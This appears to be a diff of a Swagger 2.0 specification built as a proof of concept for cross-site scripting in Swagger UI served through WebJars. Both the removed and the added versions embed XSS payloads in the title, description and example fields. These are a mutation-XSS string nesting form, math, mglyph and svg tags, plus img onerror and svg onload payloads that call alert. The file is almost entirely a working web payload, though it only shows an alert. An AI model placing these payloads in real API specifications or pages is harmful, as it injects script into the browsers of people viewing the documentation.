@@ -1,44 +1,14 @@
 swagger: '2.0'
 info:
-  title: PoC XSS Swagger WebJars
-  description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('WebJars_Swagger_XSS') src=1>"></form>
-  version: "1.0"
+  title: 'PoC XSS'
+  description: '<img src=x onerror=alert(document.domain)>'
+  version: '1.0'
 basePath: /api/
-produces:
-  - application/json
-consumes:
-  - application/json
 paths:
-  /executarXSS:
-    post:
-      summary: Testar vulnerabilidade XSS
-      description: |
-        Endpoint vulnerável a XSS via campo JSON ou XML malicioso.
-      parameters:
-        - in: body
-          name: payload
-          required: true
-          schema:
-            type: object
-            properties:
-              input:
-                type: string
-                example: <svg/onload=alert('WebJars_Swagger_XSS')>
+  /test:
+    get:
+      summary: 'Test'
+      description: '<svg onload=alert(1)>'
       responses:
         '200':
-          description: Requisição processada
-      tags:
-        - XSS
-tags:
-  - name: XSS
-    description: Prova de conceito de execução de XSS no Swagger UI
-definitions:
-  XSSPayload:
-    type: object
-    properties:
-      input:
-        type: string
-securityDefinitions:
-  basicAuth:
-    type: basic
+          description: 'ok'
